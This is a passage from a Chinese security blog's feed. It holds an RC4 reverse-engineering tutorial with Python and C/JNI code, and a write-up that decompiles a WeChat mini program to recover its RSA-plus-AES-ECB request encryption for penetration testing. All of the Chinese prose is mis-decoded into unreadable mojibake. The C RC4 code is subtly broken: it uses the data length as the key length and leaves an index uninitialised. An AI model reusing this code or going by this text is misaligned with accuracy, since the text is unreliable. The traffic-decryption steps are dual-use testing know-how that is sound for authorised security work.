class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        S.append(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_Key</span>():</span><br><span class="line">    T = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        T.append(WordList[i % <span class="number">62</span>])</span><br><span class="line">    <span class="keyword">return</span> T</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">permute_S</span>():</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">        temp = S[i]</span><br><span class="line">        S[i] = S[j]</span><br><span class="line">        S[j] = temp</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc_RC4</span>():</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text1)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        temp = S[i]</span><br><span class="line">        S[i] = S[j]</span><br><span class="line">        S[j] = temp</span><br><span class="line">        t = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        data.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(text1[num]) ^ S[t])))</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># ç¬¬ä¸€æ­¥</span></span><br><span class="line">    S = []</span><br><span class="line">    gen_S()</span><br><span class="line">    <span class="comment"># ç¬¬äºŒæ­¥</span></span><br><span class="line">    WordList = <span class="built_in">list</span>(<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>)</span><br><span class="line">    T = init_Key()</span><br><span class="line">    <span class="comment"># ç¬¬ä¸‰æ­¥</span></span><br><span class="line">    permute_S()</span><br><span class="line">    <span class="comment"># ç¬¬å››æ­¥</span></span><br><span class="line">    <span class="comment"># text = &quot;12345&quot;</span></span><br><span class="line">    <span class="comment"># enc_RC4()</span></span><br><span class="line">    <span class="comment"># ç¬¬äº”æ­¥</span></span><br><span class="line">    text1 = [<span class="string">&#x27;Â£&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;\x16&#x27;</span>]</span><br><span class="line">    enc_RC4()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131433047.png" alt="image.png"> </p><h1 id="ä¸‰-å®ç°æ ‡å‡†RC4ç®—æ³•"><a href="#ä¸‰-å®ç°æ ‡å‡†RC4ç®—æ³•" class="headerlink" title="ä¸‰ å®ç°æ ‡å‡†RC4ç®—æ³•"></a>ä¸‰ å®ç°æ ‡å‡†RC4ç®—æ³•</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(<span class="type">char</span> s[<span class="number">256</span>], <span class="type">char</span> *pwd, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_enc</span><span class="params">(<span class="type">char</span> s[<span class="number">256</span>], <span class="type">char</span> *data, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(<span class="type">char</span> S[<span class="number">256</span>], <span class="type">char</span> *K, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="type">char</span> T[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i) &#123;</span><br><span class="line">        S[i] = i;</span><br><span class="line">        T[i] = K[i % len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i) &#123;</span><br><span class="line">        j = (j + S[i] + T[i]) % <span class="number">256</span>;</span><br><span class="line">        swap(S[i],S[j]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_enc</span><span class="params">(<span class="type">char</span> S[<span class="number">256</span>], <span class="type">char</span> *data, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i , j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; len; ++k) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span>;</span><br><span class="line">        swap(S[i],S[j]);</span><br><span class="line">        <span class="type">int</span> t = (S[i] + S[j]) % <span class="number">256</span>;</span><br><span class="line">        *(data + k) ^= S[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">    JNIEXPORT jstring JNICALL</span><br><span class="line"><span class="title function_">Java_com_roysue_rc4_MainActivity_rc4</span><span class="params">(JNIEnv *env, jobject thiz, jbyteArray data)</span> &#123;</span><br><span class="line">    jbyte *t_data = env-&gt;GetByteArrayElements(data,<span class="number">0</span>);</span><br><span class="line">    env-&gt;ReleaseByteArrayElements(data,t_data,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> *c_data = reinterpret_cast&lt;<span class="type">char</span> *&gt;(t_data);</span><br><span class="line">    <span class="type">int</span> len = env-&gt;GetArrayLength(data);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> S[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> *pwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    rc4_init(S,pwd,len);</span><br><span class="line">    rc4_enc(S,c_data,len);</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(c_data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å››-RC4ç®—æ³•æ±‡ç¼–åˆ†æ"><a href="#å››-RC4ç®—æ³•æ±‡ç¼–åˆ†æ" class="headerlink" title="å›› RC4ç®—æ³•æ±‡ç¼–åˆ†æ"></a>å›› RC4ç®—æ³•æ±‡ç¼–åˆ†æ</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131441725.png" alt="image.png"> </p><p>ä¸Šå›¾ä¸­çš„ä»£ç æ˜¯æ²¡æœ‰è¿›è¡Œå˜é‡æŠ½å–ä¹‹å‰çš„ï¼Œå¯ä»¥çœ‹åˆ°å‡½æ•°åéƒ½è¿˜æ˜¯å¯ä»¥çœ‹åˆ°çš„ã€‚</p><p>å¯ä»¥åœ¨ä»£ç ä¸­åŠ ä¸Šå¦‚ä¸‹ä»£ç ï¼Œè¿›è¡Œå˜é‡æŠ½å–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set (CMAKE_CXX_FLAGS &quot;$(CMAKE_CXX_FLAGS&quot; -fvisibility=hidden)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131441940.png" alt="image.png"> </p><p>æ•´ä¸ªæ±‡ç¼–ä»£ç åŸºæœ¬å’ŒCçš„åŒºåˆ«ä¸å¤§ï¼Œè¿™å—å°±ä¸ç»†çœ‹äº†ã€‚ã€‚ã€‚ã€‚</p><p><strong>RC4ç®—æ³•çš„ç‰¹å¾æœ‰</strong>ï¼š</p><ul><li>é¦–å…ˆæ ¹æ®åŸç†æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¼šåˆå§‹åŒ–ä¸€ä¸ª256å­—èŠ‚çš„æ•°ç»„</li><li>å…¶æ¬¡ä¼šå°†ä¸€ä¸ªkeyä¹Ÿå¡«å……åˆ°æ•°ç»„ä¸­</li><li>å‡½æ•°çš„è¯å¤§æ¦‚ç‡éƒ½æ˜¯ä¸¤ä¸ªå‚æ•°,ä¸€ä¸ªæ˜¯key ä¸€ä¸ªæ˜¯keylen</li></ul><p>å…·ä½“åˆ†æï¼Œå¯ä»¥è§<a href="https://blog.csdn.net/abel_big_xu/article/details/115646413">é€†å‘åˆ†æä¸­çš„å¯†ç å­¦â€”RC4_rc4é€†å‘-CSDNåšå®¢</a></p><h1 id="äº”-æ€»ç»“"><a href="#äº”-æ€»ç»“" class="headerlink" title="äº” æ€»ç»“"></a>äº” æ€»ç»“</h1><p>RC4ç®—æ³•æœ¬èº«å®ç°å¹¶ä¸å¤æ‚ï¼Œåªè¦ç†Ÿæ‚‰å…¶åŠ å¯†&#x2F;è§£å¯†æµç¨‹ï¼Œé€†å‘åˆ†æè¿‡ç¨‹ä¸­ä¸€èˆ¬éƒ½èƒ½å¾ˆå¥½çš„è¿›è¡Œè¯†åˆ«ã€‚<br>åˆ†æå…¶å®ƒæ ‡å‡†åŠ å¯†ç®—æ³•åŸºæœ¬ä¹Ÿæ˜¯åŒæ ·çš„æµç¨‹ï¼Œå¯¹äºè‡ªå®šä¹‰çš„ä¸€äº›åŠ å¯†ç®—æ³•å°±éœ€è¦è€å¿ƒçš„è·Ÿè¸ªåˆ†æäº†ã€‚<br>å¦å¤–å¯¹äºæ ‡å‡†åŠ å¯†ç®—æ³•ï¼Œä¹Ÿå¯ä»¥å€ŸåŠ©PEIDçš„â€œKrypto ANALyzerâ€æ’ä»¶ï¼Œæˆ–è€…IDAçš„â€œFindCrypt2â€æ’ä»¶è¿›è¡Œè¯†åˆ«ï¼Œä½¿ç”¨è¿™äº›æ’ä»¶èƒ½å¤Ÿæ›´å¥½åœ°æé«˜å·¥ä½œæ•ˆç‡ã€‚</p><p>ä¸€èˆ¬ä¸æ€ä¹ˆä¼šåœ¨æ¸—é€è¿‡ç¨‹ä¸­é‡åˆ°RC4ç®—æ³•çš„ï¼Œä¸»è¦ä¸æ–¹ä¾¿ï¼Œè¿˜è¦æ±‚ä¸€æ¬¡ä¸€å¯†ã€‚ã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³•è¿˜åŸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³•è¿˜åŸ </tag>
            
            <tag> RC4 </tag>
            
            <tag> åˆ†ç»„å¯†ç  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°ç¨‹åºæ•°å­—ä¿¡å°ç®—æ³•åˆ†æ</title>
      <link href="/2024/06/12/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%95%B0%E5%AD%97%E4%BF%A1%E5%B0%81%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/"/>
      <url>/2024/06/12/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%95%B0%E5%AD%97%E4%BF%A1%E5%B0%81%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="ä¸€-ç®€ä»‹"><a href="#ä¸€-ç®€ä»‹" class="headerlink" title="ä¸€ ç®€ä»‹"></a>ä¸€ ç®€ä»‹</h1><p>æ­£å¸¸è®¿é—®ç›®æ ‡å°ç¨‹åºï¼ŒæŠ“åŒ…ï¼Œå‘ç°è¯·æ±‚å‚æ•°å’Œè¿”å›åŒ…éƒ½æ˜¯åŠ å¯†çš„</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130905436.png" alt="img"> </p><p>è¿™ç§æƒ…å†µä¸‹è‚¯å®šæ²¡æ³•è¿›ä¸€æ­¥æµ‹è¯•çš„ï¼Œè¿™å—å¯ä»¥å°ç¨‹åºåç¼–è¯‘çœ‹çœ‹äº†ã€‚</p><h1 id="äºŒ-åŠ è§£å¯†é€»è¾‘"><a href="#äºŒ-åŠ è§£å¯†é€»è¾‘" class="headerlink" title="äºŒ åŠ è§£å¯†é€»è¾‘"></a>äºŒ åŠ è§£å¯†é€»è¾‘</h1><p>1ã€ä½¿ç”¨unveilråç¼–è¯‘åï¼Œå¾®ä¿¡å¼€å‘è€…å·¥å…·æ‰“å¼€ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130906948.png" alt="image.png"> </p><p>ç›´æ¥æ‰“å¼€æ—¶è¿™ç§ä¹±ç çš„ï¼Œå¯è¯»æ€§å¤ªå·®äº†ã€‚</p><p>å¯ä»¥ä½¿ç”¨åœ¨çº¿JSç¾åŒ–å·¥å…·ï¼ˆ <a href="https://coding.tools/cn/javascript-beautifier">https://coding.tools/cn/javascript-beautifier</a>  ï¼‰ï¼Œå°†ä»£ç æ ¼å¼åŒ–ä¸‹ï¼Œè¿™æ ·è¯»èµ·æ¥å°±æ–¹ä¾¿å¤šäº†ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130906280.png" alt="img"> </p><p>2ã€è§‚å¯Ÿæ•°æ®åŒ…ï¼Œä¼šå‘ç°åœ¨è¯·æ±‚å’Œå“åº”ä¸­æœ‰2ä¸ªå‚æ•°ï¼šâ€œ<strong>akey</strong>â€å’Œâ€œ<strong>data</strong>â€ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130906369.png" alt="image.png"> </p><p>3ã€ç›´æ¥åœ¨ä»£ç ä¸­å…¨å±€æ£€ç´¢ä¸€ä¸‹å…³é”®å­— â€œakeyâ€:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130906417.png" alt="image.png"> </p><p>4ã€å¯ä»¥çœ‹åˆ°å’Œå…³é”®å­—å…³è”çš„4ä¸ªå‡½æ•°ï¼š</p><ul><li>encodeAES_ECB</li><li>decodeAES_ECB</li><li>encodeRSA_module</li><li>decodeRSA_module</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130907720.png" alt="image.png"> </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> u = &#123;</span><br><span class="line">    <span class="attr">getRandomStr</span>: <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> e = [], n = <span class="number">0</span>; n &lt; t; n++) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">26</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>()),</span><br><span class="line">                i = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">97</span> + r);</span><br><span class="line">            e.<span class="title function_">push</span>(i.<span class="title function_">toUpperCase</span>())</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">encodeAES_ECB</span>: <span class="keyword">function</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">        <span class="string">&quot;string&quot;</span> != <span class="keyword">typeof</span> t &amp;&amp; (t = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(t));</span><br><span class="line">        <span class="keyword">var</span> n = i.<span class="property">default</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(t, i.<span class="property">default</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(e), &#123;</span><br><span class="line">            <span class="attr">mode</span>: i.<span class="property">default</span>.<span class="property">mode</span>.<span class="property">ECB</span>,</span><br><span class="line">            <span class="attr">padding</span>: i.<span class="property">default</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> i.<span class="property">default</span>.<span class="property">enc</span>.<span class="property">Base64</span>.<span class="title function_">stringify</span>(n.<span class="property">ciphertext</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">decodeAES_ECB</span>: <span class="keyword">function</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">        <span class="string">&quot;string&quot;</span> != <span class="keyword">typeof</span> t &amp;&amp; (t = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(t));</span><br><span class="line">        <span class="keyword">var</span> n = i.<span class="property">default</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(t, i.<span class="property">default</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(e), &#123;</span><br><span class="line">            <span class="attr">mode</span>: i.<span class="property">default</span>.<span class="property">mode</span>.<span class="property">ECB</span>,</span><br><span class="line">            <span class="attr">padding</span>: i.<span class="property">default</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> i.<span class="property">default</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">stringify</span>(n)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">encodeRSA_module</span>: <span class="keyword">function</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = <span class="keyword">new</span> s.<span class="property">default</span>;</span><br><span class="line">        <span class="keyword">return</span> r.<span class="title function_">setPublic</span>(e, n),</span><br><span class="line">            <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> e, n, r = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>,</span><br><span class="line">                    i = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">for</span> (e = <span class="number">0</span>; e + <span class="number">3</span> &lt;= t.<span class="property">length</span>; e += <span class="number">3</span>) n = <span class="built_in">parseInt</span>(t.<span class="title function_">substring</span>(e, e + <span class="number">3</span>), <span class="number">16</span>), i += r.<span class="title function_">charAt</span>(n &gt;&gt; <span class="number">6</span>) + r.<span class="title function_">charAt</span>(<span class="number">63</span> &amp; n);</span><br><span class="line">                <span class="keyword">for</span> (e + <span class="number">1</span> == t.<span class="property">length</span> ? (n = <span class="built_in">parseInt</span>(t.<span class="title function_">substring</span>(e, e + <span class="number">1</span>), <span class="number">16</span>), i += r.<span class="title function_">charAt</span>(n &lt;&lt; <span class="number">2</span>)) : e + <span class="number">2</span> == t.<span class="property">length</span> &amp;&amp; (n = <span class="built_in">parseInt</span>(t.<span class="title function_">substring</span>(e, e + <span class="number">2</span>), <span class="number">16</span>), i += r.<span class="title function_">charAt</span>(n &gt;&gt; <span class="number">2</span>) + r.<span class="title function_">charAt</span>((<span class="number">3</span> &amp; n) &lt;&lt; <span class="number">4</span>));</span><br><span class="line">                    (<span class="number">3</span> &amp; i.<span class="property">length</span>) &gt; <span class="number">0</span>;) i += <span class="string">&quot;=&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> i</span><br><span class="line">            &#125;(r.<span class="title function_">encrypt</span>(t))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">decodeRSA_module</span>: <span class="keyword">function</span>(<span class="params">t, e, n, r</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> i = <span class="keyword">new</span> s.<span class="property">default</span>;</span><br><span class="line">        <span class="keyword">return</span> i.<span class="title function_">setPrivate</span>(e, n, r), i.<span class="title function_">decrypt</span>(<span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e, n = <span class="string">&quot;&quot;</span>,</span><br><span class="line">                r = <span class="number">0</span>,</span><br><span class="line">                i = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (e = <span class="number">0</span>; e &lt; t.<span class="property">length</span> &amp;&amp; <span class="string">&quot;=&quot;</span> != t.<span class="title function_">charAt</span>(e); ++e) &#123;</span><br><span class="line">                <span class="keyword">var</span> o = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>.<span class="title function_">indexOf</span>(t.<span class="title function_">charAt</span>(e));</span><br><span class="line">                o &lt; <span class="number">0</span> || (<span class="number">0</span> == r ? (n += <span class="title function_">a</span>(o &gt;&gt; <span class="number">2</span>), i = <span class="number">3</span> &amp; o, r = <span class="number">1</span>) : <span class="number">1</span> == r ? (n += <span class="title function_">a</span>(i &lt;&lt; <span class="number">2</span> | o &gt;&gt; <span class="number">4</span>), i = <span class="number">15</span> &amp; o, r = <span class="number">2</span>) : <span class="number">2</span> == r ? (n += <span class="title function_">a</span>(i), n += <span class="title function_">a</span>(o &gt;&gt; <span class="number">2</span>), i = <span class="number">3</span> &amp; o, r = <span class="number">3</span>) : (n += <span class="title function_">a</span>(i &lt;&lt; <span class="number">2</span> | o &gt;&gt; <span class="number">4</span>), n += <span class="title function_">a</span>(<span class="number">15</span> &amp; o), r = <span class="number">0</span>))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span> == r &amp;&amp; (n += <span class="title function_">a</span>(i &lt;&lt; <span class="number">2</span>)), n</span><br><span class="line">        &#125;(t))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">decodeRSA</span>: <span class="keyword">function</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> n = <span class="keyword">new</span> o.<span class="property">default</span>;</span><br><span class="line">        <span class="keyword">return</span> n.<span class="title function_">setPrivateKey</span>(e), n.<span class="title function_">decrypt</span>(t)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">e.<span class="property">default</span> = u</span><br></pre></td></tr></table></figure><h2 id="åŠ å¯†é€»è¾‘"><a href="#åŠ å¯†é€»è¾‘" class="headerlink" title="åŠ å¯†é€»è¾‘"></a>åŠ å¯†é€»è¾‘</h2><p>1ã€æ ¹æ®ä¸Šé¢æ‰¾åˆ°çš„å‡½æ•°<strong>encodeRSA_module</strong>ï¼ŒæŸ¥æ‰¾å¼•ç”¨çš„ä½ç½®ã€‚æ‰¾åˆ°è¯·æ±‚å¤´ä¸­akeyçš„ç”Ÿæˆé€»è¾‘</p><p>è¿™å—å¯ä»¥çœ‹åˆ°è¯·æ±‚å¤´ä¸­çš„ akey ç”Ÿæˆé€»è¾‘ï¼š</p><p>â‘ å…ˆç”Ÿæˆä¸€ä¸ª16ä½çš„éšæœºå­—ç¬¦ä¸²ä½œä¸ºAESåŠ å¯†çš„å¯†é’¥</p><p>â‘¡è°ƒç”¨c.default.encodeRSA_moduleå‡½æ•°ï¼Œä½¿ç”¨RSAå…¬é’¥å¯¹ç”Ÿæˆçš„AESå¯†é’¥åŠ å¯†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r = c.default.getRandomStr(16)</span><br><span class="line">i = c.default.encodeRSA_module(r, s.default.getters.currentConfigs.modulus, s.default.getters.currentConfigs.publicExponent)</span><br><span class="line"></span><br><span class="line">token: s.default.getters.currentToken</span><br><span class="line">akey: i</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130907548.png" alt="image.png"> </p><p>2ã€æ ¹æ®å‡½æ•°<strong>encodeAES_ECB</strong>ï¼ŒæŸ¥æ‰¾å¼•ç”¨ä½ç½®ã€‚æ‰¾åˆ°è¯·æ±‚å‚æ•° data çš„ç”Ÿæˆé€»è¾‘ï¼š</p><p>åˆ©ç”¨å‰é¢ç”Ÿæˆçš„éšæœºå­—ç¬¦ä¸²ä½œä¸ºå¯†é’¥ï¼Œå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡ŒåŠ å¯†å¾—åˆ°data</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">    data: u ? s.default.encodeAES_ECB(&#123;</span><br><span class="line">        service: &quot;adequacy.101&quot;,</span><br><span class="line">        json: i.default.getters._personalInfo</span><br><span class="line">    &#125;, n) : &#123;</span><br><span class="line">        service: &quot;adequacy.101&quot;,</span><br><span class="line">        json: i.default.getters._personalInfo</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130908762.png" alt="image.png"> </p><p>ã€åˆ°è¿™é‡ŒåŸºæœ¬å°±å¯ä»¥æ˜æ–‡è¯·æ±‚åŒ…ä¸­çš„åŠ å¯†é€»è¾‘äº†ï¼ˆ<strong>æ•°å­—ä¿¡å°</strong>ï¼‰ï¼š</p><ul><li>akeyï¼šä½¿ç”¨RSAå…¬é’¥å¯¹éšæœºçš„AESå¯†é’¥è¿›è¡ŒåŠ å¯†</li><li>dataï¼šä½¿ç”¨AES-ECBè¿›è¡Œå¯¹ç§°åŠ å¯†</li></ul><h2 id="è§£å¯†é€»è¾‘"><a href="#è§£å¯†é€»è¾‘" class="headerlink" title="è§£å¯†é€»è¾‘"></a>è§£å¯†é€»è¾‘</h2><p>åŒç†ï¼Œå’Œä¸Šé¢åˆ†æåŠ å¯†ç®—æ³•çš„æ—¶å€™ä¸€æ ·ï¼Œå¯ä»¥åˆ¤æ–­å‡ºè§£å¯†é€»è¾‘å¦‚ä¸‹ï¼š</p><ul><li>akeyï¼šæœåŠ¡ç«¯è¿”å›çš„å‚æ•°ä¸­å¸¦æœ‰AESçš„å¯†é’¥ï¼Œéœ€è¦ä½¿ç”¨RSAç§é’¥è§£å¯†åæ‰å¯å¾—åˆ°</li><li>dataï¼šåˆ©ç”¨ä»akeyä¸­è·å–çš„AESå¯†é’¥è§£å¯†</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130908816.png" alt="image.png"> </p><h1 id="ä¸‰-AESå¯†é’¥è·å–"><a href="#ä¸‰-AESå¯†é’¥è·å–" class="headerlink" title="ä¸‰ AESå¯†é’¥è·å–"></a>ä¸‰ AESå¯†é’¥è·å–</h1><p>å‰é¢è¯´åˆ°AESå¯†é’¥çš„åŠ å¯†å’Œè§£å¯†æ˜¯é€šè¿‡RSAå…¬ç§é’¥æ¥å®ç°çš„ï¼Œé‚£è¿™å—RSAå…¬ç§é’¥ä»å“ªå„¿æ¥å‘¢ï¼Ÿï¼Ÿï¼Ÿ</p><p>1ã€æŸ¥çœ‹ä»£ç ä¸­çš„encodeRSA_moduleå‡½æ•°çš„å‚æ•°ä¸­æåˆ°äº†å‡ ä¸ªå‚æ•°ï¼š</p><ul><li>i.default.getters.currentConfigs.modulus</li><li>i.default.getters.currentConfigs.publicExponent</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130911701.png" alt="image.png"> </p><p>2ã€decodeRSA_moduleå‡½æ•°çš„å‚æ•°ä¸­æåˆ°äº†å‡ ä¸ªå‚æ•°ï¼š</p><ul><li>s.default.getters.currentConfigs.modulus2</li><li>s.default.getters.currentConfigs.publicExponent</li><li>s.default.getters.currentConfigs.privateExponent</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130911390.png" alt="img"> </p><p>3ã€è¿™å‡ ä¸ªå‚æ•°å…·ä½“æ˜¯ä»€ä¹ˆä½œç”¨ï¼Ÿï¼Ÿï¼Ÿ</p><p>æŸ¥çœ‹è¯·æ±‚æ•°æ®åŒ…ä¸­ï¼Œå‘ç°åœ¨åˆšå¼€å§‹æ‰“å¼€ç¨‹åºçš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ªè¿”å›åŒ…ä¸­æ˜¯æœ‰æºå¸¦è¿™äº›å‚æ•°çš„ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130911958.png" alt="image.png"> </p><p>è¿™å¿«ä¹Ÿå°±æ„å‘³ç€ï¼Œæ¯æ¬¡å¯åŠ¨å°ç¨‹åºï¼ŒæœåŠ¡ç«¯éƒ½ä¼šè¿”å›RSAå¯†é’¥çš„ç›¸å…³å‚æ•°ï¼Œç”¨æ¥åœ¨å®¢æˆ·ç«¯ç”ŸæˆRSAå…¬ç§é’¥ã€‚</p><h2 id="RSAæ¨¡æ•°å’ŒæŒ‡æ•°åŸç†"><a href="#RSAæ¨¡æ•°å’ŒæŒ‡æ•°åŸç†" class="headerlink" title="RSAæ¨¡æ•°å’ŒæŒ‡æ•°åŸç†"></a>RSAæ¨¡æ•°å’ŒæŒ‡æ•°åŸç†</h2><p>è¿™å—æ”¾åœ¨åé¢è¯¦ç»†è¯´ä¸€ä¸‹ã€‚ã€‚ã€‚</p><h2 id="Pythonä»£ç å®ç°"><a href="#Pythonä»£ç å®ç°" class="headerlink" 